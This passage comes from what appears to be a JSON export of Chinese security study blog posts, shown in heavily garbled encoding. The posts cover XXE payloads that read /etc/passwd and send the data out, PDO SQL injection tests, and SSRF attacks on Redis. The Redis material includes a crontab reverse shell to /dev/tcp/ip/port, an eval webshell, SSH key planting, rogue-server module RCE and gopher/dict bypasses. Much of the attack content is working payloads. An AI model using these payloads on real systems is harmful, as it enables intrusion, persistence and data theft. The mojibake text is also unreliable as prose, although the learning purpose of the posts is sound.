&quot;http://ip/evil.dtd&quot;&gt; 12&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt; æ— å›æ˜¾XXEå…³äºdtdçš„å¼•ç”¨æŠ€å·§åœ¨ä¸Šæ–‡å·²ç»ä»‹ç»çš„å¾ˆæ¸…æ¥šäº†ï¼Œä¹‹å‰è¯´é“SYSTEM/PUBLICå…³é”®å­—å®ç°åŸç†æ˜¯XMLè§£æå™¨å¯¹åé¢çš„urlå‘èµ·ä¸€æ¬¡ä¸‹è½½è¯·æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥é¦–å…ˆä½¿ç”¨nc -lvv portæ¥ç›‘å¬ç«¯å£ï¼Œæ”¶åˆ°è¯·æ±‚åå°±ä¼šæˆåŠŸçš„æŠŠæ–‡ä»¶ä¿¡æ¯å¸¦å‡ºï¼Œå…³é”®payloadå¦‚ä¸‹: 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &apos;http://ip:port?p=%file;&apos;&gt;&quot;&gt; å½“ç„¶ï¼ŒXXEæ³¨å…¥æŠ€å·§è¿˜æœ‰è®¸å¤šï¼Œæœ¬æ–‡å°±å…ˆåˆ†æåˆ°è¿™é‡Œï¼Œä¹‹åå†æ¥è¡¥å……ã€‚ æœ¬åœ°DTDæ–‡ä»¶åœ¨é¶æœºä¸é€šå¤–ç½‘çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åº”ç”¨æœ¬åœ°DTDæ–‡ä»¶ 1ubuntuè‡ªå¸¦ï¼š/usr/share/yelp/dtd/docbookx.dtd 1234567891011&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt; &lt;!ENTITY % ISOamso &apos; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;test&amp;#x25;file&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &apos;&gt; %local_dtd;]&gt; åŸºäºæŠ¥é”™çš„XXE12345678910&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ELEMENT message ANY&gt; &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt; &lt;!ENTITY % para &apos; &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt; &amp;#x25;para2; &apos;&gt; %para;]&gt; å‚è€ƒæ–‡çŒ®https://xz.aliyun.com/t/3357#toc-22 https://www.freebuf.com/vuls/207639.html","categories":[{"name":"XXE","slug":"XXE","permalink":"http://yoursite.com/categories/XXE/"}],"tags":[]},{"title":"pdoå­¦ä¹ ","slug":"PDOå­¦ä¹ ","date":"2019-10-01T16:00:00.000Z","updated":"2020-10-06T07:14:32.250Z","comments":true,"path":"2019/10/02/PDOå­¦ä¹ /","link":"","permalink":"http://yoursite.com/2019/10/02/PDOå­¦ä¹ /","excerpt":"","text":"PDOé¢„å¤„ç†å­¦ä¹ å‰è¨€åœ¨ä»£ç å®¡è®¡çš„æ—¶å€™ï¼Œç»å¸¸ä¼šç¢°åˆ°ä¸pdoæœ‰å…³çš„sqlæ³¨å…¥ï¼Œé€šè¿‡çœ‹å„ç§æ–‡ç« ï¼Œæ„Ÿè§‰è¿˜æ˜¯å¼„ä¸æ‡‚é¢„å¤„ç†æ˜¯å¦‚ä½•é¢„é˜²sqlæ³¨å…¥çš„ï¼Œäºæ˜¯å°±é€šè¿‡æŠ“å–æµé‡åŒ…çš„å½¢å¼ï¼Œæ›´åŠ æ·±å…¥çš„äº†è§£pdoé¢„å¤„ç†ã€‚ ç¯å¢ƒé…ç½®ä½¿ç”¨WireSharkï¼Œé€‰æ‹©Adapter for loopback traffic captureç½‘å¡å³å¯æŠ“å–æœ¬åœ°æµé‡åŒ…ã€‚ æ·±å…¥å­¦ä¹ ç”±äºå¹¶ä¸æ˜¯æ‰€æœ‰çš„æ•°æ®åº“é©±åŠ¨éƒ½æ”¯æŒé¢„ç¼–è¯‘æ¨¡å¼ï¼Œæ‰€ä»¥PDOæœ‰æ¨¡æ‹Ÿé¢„å¤„ç†åŠŸèƒ½ï¼Œå°±æ˜¯PDOå†…éƒ¨ä¼šæ¨¡é€†å‚æ•°ç»‘å®šçš„è¿‡ç¨‹ï¼Œæœ€ååœ¨executeæ—¶å‘é€å®Œæ•´çš„sqlè¯­å¥ç»™æ•°æ®åº“æ‰§è¡Œï¼ŒPDOçš„æ¨¡é€†é¢„å¤„ç†åŠŸèƒ½æ˜¯é»˜è®¤æ‰“å¼€çš„ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®ATTR_EMULATE_PREPARES=falseæ¥å…³é—­æ¨¡é€†ã€‚ ç›´æ¥ä¸Šä»£ç æ¼”ç¤ºä¸¤ç§æ¨¡å¼ æœ¬åœ°é¢„å¤„ç†123456789&lt;?php$pdo=new PDO(\"mysql:host=localhost;dbname=pdotest\",\"root\",\"root\");$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES,false)$user=\"lili\";$sql=\"select * from user where username=?\";$st=$pdo-&gt;prepare($sql);$st-&gt;bindParam(1,$user);$st-&gt;execute();?&gt; æŠ“å–æµé‡åŒ… å‘ç°åœ¨prepareæ—¶ï¼Œä¼šå‘é€ä¸€ä¸ªå¸¦æœ‰å ä½ç¬¦çš„mysqlé¢„å¤„ç†è¯­å¥ï¼Œåœ¨executeæ—¶ï¼Œå°†ç»‘å®šçš„å‚æ•°å‘é€ç»™æ•°æ®åº“ã€‚ å°è¯•ä¸€ä¸‹sqlæ³¨å…¥ å‘é€æ•°æ®æ—¶æœªç»è¿‡ä»»ä½•å¤„ç†ï¼Œä½†æ˜¯å¾—ä¸åˆ°è¿”å›ç»“æœï¼ŒæŸ¥çœ‹mysqlæŸ¥è¯¢æ—¥å¿—ã€‚ çœ‹æ¥åœ¨mysqlæœ¬åœ°çš„é¢„å¤„ç†ï¼Œä¹Ÿä¼šå°†æ•°æ®è½¬ä¹‰ï¼Œé‚£ä¹ˆå°è¯•ä¸€ä¸‹å®½å­—èŠ‚æ³¨å…¥ï¼Œå‘ç°æ— æ³•å¾—åˆ°ç»“æœï¼ŒæŸ¥çœ‹æ—¥å¿— çœ‹æ¥å½“ç¼–ç è®¾ç½®ä¸ºGBKæ—¶ï¼Œmysqlä¼šå°†å­—ç¬¦ä¸²è½¬æ¢æˆ16è¿›åˆ¶ï¼Œæ‰€ä»¥æ— æ³•æ³¨å…¥ã€‚ å½“ä½¿ç”¨æœ¬åœ°é¢„å¤„ç†æ—¶ï¼Œèƒ½ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œè€Œä¸”åªéœ€è¦æ‰§è¡Œåˆ°prepareå°±èƒ½å¤Ÿå°†ç”¨æˆ·åï¼Œç‰ˆæœ¬è¿™äº›ä¿¡æ¯çˆ†å‡ºæ¥ï¼Œå‰ææ˜¯èƒ½å¤Ÿæ§åˆ¶å‚æ•°å†…å®¹ã€‚ 12345678&lt;?php$pdo=new PDO(&quot;mysql:host=localhost;dbname=pdotest&quot;,&quot;root&quot;,&quot;root&quot;);$user=&quot;lili&quot;;$pdo-&gt;setAttribute(pdo::ATTR_EMULATE_PREPARES, false);$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);$sql=&quot;select * from user where username=(updatexml(0,concat(0xa,user()),0))&quot;;$st=$pdo-&gt;prepare($sql);?&gt; å°è¯•çˆ†å‡ºæ•°æ® 1$sql=&quot;select * from user where username=(updatexml(0,concat(0xa,(select * from user limit 1)),0))&quot;; è¿™é‡Œéå¸¸å¥‡æ€ªï¼Œå› ä¸ºéœ€è¦æ‰§è¡Œåˆ°executeæ‰ä¼šåœ¨æµé‡åŒ…ä¸­è¿”å›é”™è¯¯ï¼Œä½†æ˜¯PDOå¹¶ä¸ä¼šæŠ¥é”™ï¼Œå»ç½‘ä¸Šæœéƒ½è¯´PDOä¸æ”¯æŒå­æŸ¥è¯¢ï¼Œä½†æˆ‘è¿™é‡Œç¡®å®è¿”å›äº†æŠ¥é”™ï¼Œä¸è§£ã€‚ æ¨¡æ‹Ÿé¢„å¤„ç†12345678&lt;?php$pdo=new PDO(\"mysql:host=localhost;dbname=pdotest\",\"root\",\"root\");$user=\"1' or 1=1 #\";$sql=\"select * from user where username=?\";$st=$pdo-&gt;prepare($sql);$st-&gt;bindParam(1,$user);$st-&gt;execute();?&gt; æŠ“å–æµé‡åŒ… å‘ç°å­—ç¬¦ä¸²è¢«è½¬ä¹‰äº†ï¼Œè¿™æ˜¯å› ä¸ºä½¿ç”¨bindParamæ—¶ï¼Œä¼šè¿›è¡Œå­—ç¬¦ä¸²è½¬ä¹‰æ“ä½œï¼ŒåŒmysql_real_escape_stringã€‚ æ—¢ç„¶æ˜¯è½¬ä¹‰ï¼Œæ„Ÿè§‰ä¹Ÿèƒ½è¿›è¡Œå®½å­—èŠ‚æ³¨å…¥ã€‚ é¦–å…ˆéœ€è¦è®¾ç½®ä¸€ä¸‹ç¼–ç  1$pdo-&gt;query('SET NAMES GBK'); æŠ“åŒ…å‘ç°æˆåŠŸè¿”å›ç»“æœï¼Œå®½å­—èŠ‚æ³¨å…¥æˆåŠŸã€‚ pdoçš„mysqlè¯­å¥å¤šè¡Œæ‰§è¡Œä¹Ÿæ˜¯é»˜è®¤æ‰“å¼€çš„ï¼Œæ‰€ä»¥åœ¨å¯ä»¥æ§åˆ¶å‚æ•°å‰æä¸‹ï¼Œèƒ½å¤Ÿä½¿ç”¨å¤šè¡Œæ¥è¿›è¡Œæ³¨å…¥ã€‚ æ€»ç»“æ€»ä¹‹ï¼Œåªè¦ä½¿ç”¨å‚æ•°ç»‘å®šï¼Œå¹¶è®¾ç½®æœ¬åœ°é¢„å¤„ç†ä¼˜å…ˆï¼ŒåŸºæœ¬ä¸Šå°±å®Œç¾é˜²å¾¡äº†sqlæ³¨å…¥ã€‚","categories":[{"name":"pdo","slug":"pdo","permalink":"http://yoursite.com/categories/pdo/"}],"tags":[]},{"title":"SSRF","slug":"åè®®å­¦ä¹ ","date":"2019-09-27T16:00:00.000Z","updated":"2020-11-17T13:42:53.402Z","comments":true,"path":"2019/09/28/åè®®å­¦ä¹ /","link":"","permalink":"http://yoursite.com/2019/09/28/åè®®å­¦ä¹ /","excerpt":"","text":"SSRFå­¦ä¹ URLç»“æ„urlä¸ºç»Ÿä¸€èµ„æºå®šä½ç¬¦ã€‚ urlæ ‡å‡†æ ¼å¼å¦‚ä¸‹ï¼š 1[åè®®ç±»å‹]://[æœåŠ¡å™¨åœ°å€]:[ç«¯å£å·]/[èµ„æºå±‚çº§UNIXæ–‡ä»¶è·¯å¾„][æ–‡ä»¶å]?[æŸ¥è¯¢]#[ç‰‡æ®µID urlå®Œæ•´æ ¼å¼å¦‚ä¸‹ï¼š 1[åè®®ç±»å‹]://[è®¿é—®èµ„æºéœ€è¦çš„å‡­è¯ä¿¡æ¯]@[æœåŠ¡å™¨åœ°å€]:[ç«¯å£å·]/[èµ„æºå±‚çº§UNIXæ–‡ä»¶è·¯å¾„][æ–‡ä»¶å]?[æŸ¥è¯¢]#[ç‰‡æ®µID] åè®®ç±»å‹ï¼šä¸€èˆ¬å«æœ‰http,https,file,ftp,gopher,wais,news,telent å‡­è¯ä¿¡æ¯ï¼šusername:passwordï¼Œä»¥@ç»“å°¾ Redisæ¼æ´åˆ©ç”¨åœ¨ä»‹ç»æ¼æ´åˆ©ç”¨ä¹‹å‰ï¼Œé¦–å…ˆäº†è§£ä¸€ä¸‹Redisçš„æ•°æ®ä¼ è¾“åè®®ã€‚ Redisæ•°æ®ä¼ è¾“åè®®Redisä½¿ç”¨RESPåºåˆ—åŒ–åè®®å°†ä¼ è¾“çš„æ•°æ®åˆ†ä¸ºä»¥ä¸‹äº”ç§æœ€å°å•å…ƒç±»å‹ï¼Œå•å…ƒç»“æŸæ—¶åŠ ä¸Š\\r\\næ¢è¡Œç¬¦ï¼š å•è¡Œå›å¤ï¼šå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ â€œ+â€ é”™è¯¯ä¿¡æ¯ï¼šå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ â€œ-â€œ æ•´å½¢æ•°å­—ï¼šå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ â€œ:â€ å¤šè¡Œå­—ç¬¦ä¸²ï¼šå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ â€œ$â€ æ•°ç»„ï¼šå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ â€œ*â€ ä»»æ„æ–‡ä»¶å†™å…¥ç”±äºRedisçš„å¤‡ä»½åŠŸèƒ½å¯ä»¥ä»»æ„æŒ‡å®šç›®å½•ï¼Œè¿™å°±é€ æˆäº†ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ï¼Œä¸»è¦æœ‰åå¼¹shellã€å†™WebShellã€å†™sshå…¬é’¥è¿™å‡ ç§æ”»å‡»æ–¹å¼ã€‚ å¼¹shellåˆ©ç”¨æ–¹å¼é¦–å…ˆè®²ä¸€ä¸‹Linuxçš„å®šæ—¶ä»»åŠ¡ï¼Œåœ¨Linuxä¸­corntabå‘½ä»¤ç”¨äºè®¾ç½®å‘¨æœŸæ€§è¢«æ‰§è¡Œçš„ä»»åŠ¡ï¼Œcrontabå‘½ä»¤ä»æ ‡å‡†è¾“å…¥è®¾å¤‡è¯»å–æŒ‡ä»¤ï¼Œå¹¶å­˜æ”¾äºcrontabæ–‡ä»¶ä¸­ï¼Œä»¥ä¾›ä¹‹åçš„è¯»å–å’Œæ‰§è¡Œã€‚ crontabå‘½ä»¤è¯»å–ç›®å½• 12/var/spool/cron//etc/crontab crontabæ–‡ä»¶æ ¼å¼å¦‚ä¸‹ 1234567minute hour day month week commandæ“ä½œç¬¦æœ‰* å–å€¼èŒƒå›´å†…æ‰€æœ‰æ•°å­—/ æ¯éš”å¤šä¹…æ‰§è¡Œä¸€æ¬¡x-z ä»x-zxï¼Œz æ¯xå’Œzæ‰§è¡Œä¸€æ¬¡* * * * * ä»£è¡¨æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ æˆ‘ä»¬åˆ©ç”¨Redisçš„å¤‡ä»½åŠŸèƒ½ï¼Œåœ¨crontabè¯»å–å‘½ä»¤çš„ç›®å½•ä¸­ï¼Œå†™å…¥shellï¼Œå³å¯æ‰§è¡Œshellå‘½ä»¤ã€‚ 1234set x \"* * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\"config set dir /var/spool/cron/config set dbfilename rootsave åˆ©ç”¨æ¡ä»¶ å¼¹shellè¦æ±‚Redisåœ¨rootç”¨æˆ·ä¸‹è¿è¡Œ ç”±äºRediså¤‡ä»½çš„æ˜¯Redisæ ¼å¼çš„æ•°æ®ï¼Œæ‰€ä»¥ä¼šåŒ…å«è®¸å¤šä¹±ç ï¼Œåœ¨Ubuntuä¸‹ä¸èƒ½æ‰§è¡Œï¼ˆCentosä¼šè‡ªåŠ¨å¿½ç•¥é”™è¯¯ä¿¡æ¯ï¼‰ã€‚ å†™å…¥WebShell1234set x &quot;&lt;?php eval($_POST[&apos;aa&apos;]);?&gt;&quot;config set dir /Webç›®å½•config set dbfilename &quot;shell.php&quot;save åˆ©ç”¨æ¡ä»¶ Webç›®å½•å†™å…¥æƒé™ å†™å…¥sshå…¬é’¥12345678æœ¬åœ°ç”Ÿæˆå¯†é’¥å¯¹ssh-keygen -t rsa##å°†å…¬é’¥å†™å…¥æœåŠ¡å™¨/root/.sshæ–‡ä»¶å¤¹ä¸­set x &quot;å…¬é’¥&quot;config set dir /root/.sshconfig set dbfilename &quot;authorized_keys&quot;save æ”»å‡»è€…æ‰§è¡Œ 1ssh -i ç§é’¥ root@ip åˆ©ç”¨æ¡ä»¶ rootæƒé™ ä¸»ä»å¤åˆ¶RCEè™½ç„¶redisè¯»å–å†™å…¥çš„é€Ÿåº¦å¾ˆå¿«ï¼Œå½“å¤§é‡çš„è®¿é—®æ•°æ®åº“çš„æ—¶å€™ï¼Œä¸ºäº†åˆ†æ‹…å‹åŠ›ï¼ŒRediæ”¯æŒä¸»ä»å¤åˆ¶åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯è¯»å†™åˆ†ç¦»ï¼ŒèŠ‚ç‚¹å¤åˆ¶ä¸»èŠ‚ç‚¹å…¨éƒ¨æ•°æ®(æ•°æ®å¤åˆ¶åªèƒ½ç”±ä¸»èŠ‚ç‚¹å¤åˆ¶åˆ°ä»èŠ‚ç‚¹)ï¼Œç”±ä¸»èŠ‚ç‚¹æä¾›å†™æœåŠ¡ï¼Œä»èŠ‚ç‚¹æä¾›è¯»æœåŠ¡ï¼Œå¯å¤§å¤§æé«˜RedisæœåŠ¡å™¨çš„å¹¶å‘é‡ã€‚ æ¼æ´åˆ©ç”¨åŸç†å¯æ‰©å±•moduleä¸ºäº†ä½¿Redisçš„ä½¿ç”¨æ›´åŠ çš„çµæ´»ï¼ŒRedus4.0ä»¥ä¸Šç‰ˆæœ¬æ”¯æŒäº†å¯æ‰©å±•çš„moduleï¼Œå¹¶ç»™å‡ºäº†APIæ–‡ä»¶å’Œå®˜æ–¹ç¤ºä¾‹ã€‚ ç”¨æˆ·åªéœ€æŒ‰ç…§APIç¼–å†™è‡ªå·±çš„moduleï¼Œå¹¶ä½¿ç”¨module load module.soå‘½ä»¤åŠ è½½æ¨¡ç»„ï¼Œå³å¯å¾€RedisæœåŠ¡å™¨ä¸­æ·»åŠ è‡ªå·±çš„å‘½ä»¤ï¼Œéå¸¸çš„æ–¹ä¾¿ï¼Œä½†æ˜¯ä¹Ÿèƒ½è‡ªå®šä¹‰å‡½æ•°å®ŒæˆRCEã€‚ è¿™é‡Œä½¿ç”¨githubä¸Šå¤§ä½¬çš„EXPRedis-rouge-serverï¼Œè¯¥EXPç¼–å†™äº†ä¸€ä¸ªsystem.execå‘½ä»¤ï¼ŒåŠ è½½moduleåèƒ½ç›´æ¥è¿›è¡ŒRCEã€‚ ä½†æ˜¯è¿™åªæ˜¯åœ¨è‡ªå·±çš„RedisæœåŠ¡å™¨ä¸Šå®ç°äº†RCEï¼Œå¦‚ä½•å°†ä»–ä¼ å…¥å…¶ä»–çš„RedisæœåŠ¡å™¨å‘¢ï¼Ÿä¸»ä»å¤åˆ¶æ˜¯ä¸ä¼šå°†moduleä¹Ÿå¤åˆ¶ç»™ä»èŠ‚ç‚¹çš„ï¼Œè¿™å°±éœ€è¦ç”¨åˆ°ä¸‹é¢çš„ä¸»ä»å¤åˆ¶å…¨é‡åŒæ­¥ã€‚ ä¸»ä»å¤åˆ¶çš„å…¨é‡åŒæ­¥masteræœåŠ¡å™¨ä¼šå¼€å¯ä¸€ä¸ªåå°è¿›ç¨‹ç”¨äºå°†redisä¸­çš„æ•°æ®ç”Ÿæˆä¸€ä¸ªrdbæ–‡ä»¶ï¼Œä¸æ­¤åŒæ—¶ï¼ŒæœåŠ¡å™¨ä¼šç¼“å­˜æ‰€æœ‰æ¥æ”¶åˆ°çš„æ¥è‡ªå®¢æˆ·ç«¯çš„å†™å‘½ä»¤ï¼ˆåŒ…å«å¢ã€åˆ ã€æ”¹ï¼‰ï¼Œå½“åå°ä¿å­˜è¿›ç¨‹å¤„ç†å®Œæ¯•åï¼Œä¼šå°†è¯¥rdbæ–‡ä»¶ä¼ é€’ç»™slaveæœåŠ¡å™¨ï¼Œè€ŒslaveæœåŠ¡å™¨ä¼šå°†rdbæ–‡ä»¶ä¿å­˜åœ¨ç£ç›˜å¹¶é€šè¿‡è¯»å–è¯¥æ–‡ä»¶å°†æ•°æ®åŠ è½½åˆ°å†…å­˜ï¼Œåœ¨æ­¤ä¹‹åmasteræœåŠ¡å™¨ä¼šå°†åœ¨æ­¤æœŸé—´ç¼“å­˜çš„å‘½ä»¤é€šè¿‡redisä¼ è¾“åè®®å‘é€ç»™slaveæœåŠ¡å™¨ï¼Œç„¶åslaveæœåŠ¡å™¨å°†è¿™äº›å‘½ä»¤ä¾æ¬¡ä½œç”¨äºè‡ªå·±æœ¬åœ°çš„æ•°æ®é›†ä¸Šæœ€ç»ˆè¾¾åˆ°æ•°æ®çš„ä¸€è‡´æ€§ã€‚ è¿™é‡Œæœ‰ä¸€ç¯‡åšæ–‡ï¼Œæƒ³æ·±å…¥äº†è§£ä¸»ä»å¤åˆ¶å¯ä»¥çœ‹çœ‹https://www.cnblogs.com/kismetv/p/9236731.html&gt; é€šè¿‡ä¸Šé¢çš„ä¸¤ç‚¹å¯ä»¥çŸ¥é“å½“è¿›è¡Œä¸»ä»å¤åˆ¶çš„å…¨é‡åŒæ­¥æ—¶ï¼Œä¼šä¼ è¾“ä¸€ä¸ªæ–‡ä»¶ç»™slaveæœåŠ¡å™¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ç‚¹ï¼Œé€šè¿‡Pythonä¼ªé€ ä¸€ä¸ªæ¶æ„RedisæœåŠ¡å™¨æ¶æ„RedisæœåŠ¡å™¨ä¼ªé€ ï¼Œå½“æ”¶åˆ°æœåŠ¡å™¨çš„slaveè¯·æ±‚æ—¶ï¼Œæ¨¡æ‹Ÿå…¨é‡åŒæ­¥çš„è¿‡ç¨‹ï¼Œå°†æˆ‘ä»¬çš„exp.soå‘é€åˆ°slaveæœåŠ¡å™¨ä¸­ï¼Œåœ¨slaveæœåŠ¡å™¨æ‰§è¡Œmodule load exp.soå³å¯å®ç°RCEã€‚ æ¼æ´å¤ç°ä¸€å°RedisæœåŠ¡å™¨ 1docker pull shuogesha/redis5.0.5 ä¼ªé€ æ¶æ„RedisæœåŠ¡å™¨ 1https://github.com/LoRexxar/redis-rogue-server exp 1https://github.com/n0b0dyCN/RedisModules-ExecuteCommand å¯åŠ¨Reidsçš„dockerï¼Œå°†exp.soä¸ä¼ªé€ çš„RedisæœåŠ¡å™¨æ”¾å…¥åŒä¸€æ–‡ä»¶å¤¹ æ‰§è¡Œå‘½ä»¤ 1python3 redis-rogue-server.py --rhost ç›®æ ‡IP --rport ç›®æ ‡ç«¯å£ --lhost æ”»å‡»æœºIP æ³¨æ„ï¼šæ”»å‡»æœºä¸ç›®æ ‡æœºå¿…é¡»èƒ½å¤Ÿäº’ç›¸è®¿é—®ã€‚ ç°åœ¨æ¶æ„moduleå·²ç»è¢«ç›®æ ‡åŠåŠ è½½ï¼Œè¿æ¥ä¸Šå³å¯æ‰§è¡Œå‘½ä»¤ã€‚ æ¶æ„moduleåŠ è½½RCEä¸»ä»å¤åˆ¶RCEè¦æ±‚æ”»å‡»æœºä¸ç›®æ ‡æœºå¿…é¡»èƒ½å¤Ÿäº’ç›¸è®¿é—®ï¼Œä½†å¦‚æœé¶æœºä¸èƒ½è®¿é—®å¤–ç½‘ä¸»ä»å¤åˆ¶å°±æ‰“ä¸é€šï¼Œé‚£èƒ½ä¸èƒ½åˆ©ç”¨å¤‡ä»½åŠŸèƒ½å†™å…¥æ¶æ„moduleå‘¢ï¼Œç­”æ¡ˆæ˜¯ä¸èƒ½ï¼Œä¹‹å‰è¯´è¿‡ï¼Œå¤‡ä»½å­˜å…¥çš„æ–‡ä»¶æ˜¯ä»¥Redisçš„ç‰¹æ®Šç»“æ„ä¿å­˜ï¼Œåœ¨ELFæ–‡ä»¶çœ‹æ¥å°±æ˜¯ä¹±ç ï¼Œå› ä¸ºELFæ–‡ä»¶å¯¹æ ¼å¼è¦æ±‚ä¸¥æ ¼ï¼Œæ‰€ä»¥ä¸èƒ½æ‰§è¡Œã€‚ æ‰€ä»¥åªèƒ½é…åˆWebé¡µé¢çš„æ–‡ä»¶ä¸Šä¼ ï¼Œä¸Šä¼ æ¶æ„moduleï¼Œç„¶åå†åŠ è½½moduleå®ç°RCEã€‚ gopheråè®®gopheråè®®æ ¼å¼ï¼š 1gopher://ip:port/è¿æ¥ç¬¦+TCP/IPæ•°æ® gopherä¼šå°†è¿æ¥ç¬¦åé¢çš„æ•°æ®å‘é€ç»™ç›¸åº”çš„ç«¯å£ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–æ ¼å¼çš„è¯·æ±‚åŒ…ï¼Œæ¯”å¦‚GET,POST,redis,mysqlæœªæˆæƒè®¿é—®ï¼Œå°†æ•°æ®ä½¿ç”¨urlç¼–ç ï¼Œgopheræ‰èƒ½æ­£å¸¸è§£æã€‚ dictåè®®dictåè®®æ ¼å¼: 12dict://ip:port/å‘½ä»¤:å‚æ•°:å‚æ•°dict://ip:port/å‘½ä»¤ å‚æ•° å‚æ•° dictåè®®æ˜¯è¯å…¸ç½‘ç»œåè®®ï¼Œå¯ä»¥è¿æ¥å­—å…¸æœåŠ¡å™¨ï¼ˆæ¯”å¦‚Redisï¼‰ï¼Œä¸è¿‡åªæ”¯æŒæ²¡æœ‰å¯†ç çš„Redisï¼Œå› ä¸ºdictåªèƒ½é€è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ¯æ‰§è¡Œä¸€è¡Œåï¼Œéƒ½ä¼šQUITæ–­å¼€è¿æ¥ï¼Œæ‰€ä»¥æ— æ³•ä¿å­˜èº«ä»½è®¤è¯ä¿¡æ¯ã€‚ SSRF+Redisåˆ©ç”¨é€”å¾„gopherå‘é€Redisæ•°æ®åŒ…é¦–å…ˆéœ€è¦çŸ¥é“Redisæ•°æ®åŒ…çš„æ ¼å¼ï¼Œgopheræ‰èƒ½æ­£ç¡®è§£æã€‚ ä½¿ç”¨socatç«¯å£è½¬å‘è·å–Redisæµé‡ï¼š 1socat -v tcp-listen:2333,fork tcp-connect:127.0.0.1:6379 å°†æ¥è‡ª2333ç«¯å£çš„æµé‡è½¬å‘è‡³6379ç«¯å£(ä¹Ÿå°±æ˜¯RedisæœåŠ¡å™¨ç«¯å£)ï¼Œ-vå‚æ•°èƒ½å¤Ÿæ˜¾ç¤ºè½¬å‘çš„æµé‡ã€‚ ä½¿ç”¨redis-cliè¿æ¥2333ç«¯å£ 1./redis-cli -h 127.0.0.1 -p 2333 æ‰§è¡Œset x 1å‘½ä»¤å¯ä»¥çœ‹åˆ°è½¬å‘çš„æµé‡ä¸ºï¼Œè¿™æ˜¯ç»è¿‡RESPåè®®åºåˆ—åŒ–åçš„æ•°æ® 1234567*3\\r$3\\rset\\r$1\\rx\\r$1\\r1\\r æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å°†payloadè½¬æ¢æˆå¦‚ä¸Šå½¢å¼ï¼Œç„¶åurlç¼–ç ï¼Œä½¿ç”¨gopherå‘é€å³å¯ï¼Œå‰äººæ ½æ ‘ï¼Œåäººä¹˜å‡‰ï¼Œgithubä¸Šæœ‰è®¸å¤šç”Ÿæˆpayloadè„šæœ¬https://github.com/xmsec/redis-ssrf (å¦‚æœæ˜¯getæ–¹å¼ä¼ å‚ï¼Œéœ€è¦è¿›è¡ŒäºŒæ¬¡ç¼–ç ) dicté€è¡Œæ‰§è¡Œå‘½ä»¤é¦–å…ˆå°è¯•ç›´æ¥å‘é€payload 1dict://ip:port/set:x:&quot;&lt;?php eval($_POST[&apos;aa&apos;]);?&gt;&quot; æŠ¥é”™ï¼ŒæŠ“å–ä¸€ä¸‹æµé‡å‘ç°åœ¨?å¤„è¢«æˆªæ–­ã€‚ 16è¿›åˆ¶ç¼–ç ç»•è¿‡æˆªæ–­å¯¹äº&lt;?è¿™æ ·çš„éæ³•å­—ç¬¦ï¼Œéœ€è¦ç”¨16è¿›åˆ¶ç¼–ç ï¼Œæ­£å¸¸å‘é€ã€‚ 1set x &quot;\\x3C\\x3Fphp\\x20eval($_POST[&apos;aa&apos;])\\x3B\\x3F\\x3E&quot; æˆåŠŸå†™å…¥ 123set x &quot;\\x3C\\x3Fphp\\x20eval($_POST[&apos;aa&apos;])\\x3B\\x3F\\x3E&quot;config set dir /var/www/htmlconfig set dbfilename &quot;shell.php&quot; bitopå‘½ä»¤ç»•è¿‡æˆªæ–­Bitopå‘½ä»¤ä¸ºRedisä½æ“ä½œï¼ŒBITOPå‘½ä»¤æ”¯æŒå››ä¸ªä½è¿ç®—ï¼šANDï¼ŒORï¼ŒXOR å’ŒNOT 1234BITOP AND destkey key [key ...] ï¼Œå¯¹ä¸€ä¸ªæˆ–å¤šä¸ªkeyæ±‚é€»è¾‘å¹¶ï¼Œå¹¶å°†ç»“æœä¿å­˜åˆ°destkeyBITOP OR destkey key [key ...] ï¼Œå¯¹ä¸€ä¸ªæˆ–å¤šä¸ªkeyæ±‚é€»è¾‘æˆ–ï¼Œå¹¶å°†ç»“æœä¿å­˜åˆ°destkeyBITOP XOR destkey key [key ...] ï¼Œå¯¹ä¸€ä¸ªæˆ–å¤šä¸ªkeyæ±‚é€»è¾‘å¼‚æˆ–ï¼Œå¹¶å°†ç»“æœä¿å­˜åˆ°destkeyBITOP NOT destkey key ï¼Œå¯¹ç»™å®škeyæ±‚é€»è¾‘éï¼Œå¹¶å°†ç»“æœä¿å­˜åˆ°destkey æ‰€ä»¥å¯ä»¥å°†payloadå–åï¼Œç„¶åç”¨bitop 